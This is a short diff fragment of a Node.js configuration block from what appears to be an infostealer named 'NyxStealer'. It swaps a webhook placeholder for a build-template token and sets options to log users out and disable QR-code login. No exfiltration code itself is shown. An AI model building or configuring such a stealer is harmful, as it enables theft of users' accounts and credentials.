@@ -10,7 +10,7 @@ const fs = require("fs");
 var config = {
     brand: "NyxStealer",
 
-    webhook: "REPLACE_ME",
+    webhook: "%WEBHOOK_LINK%",
 
     logout: true,
     disable_qr_code: true,
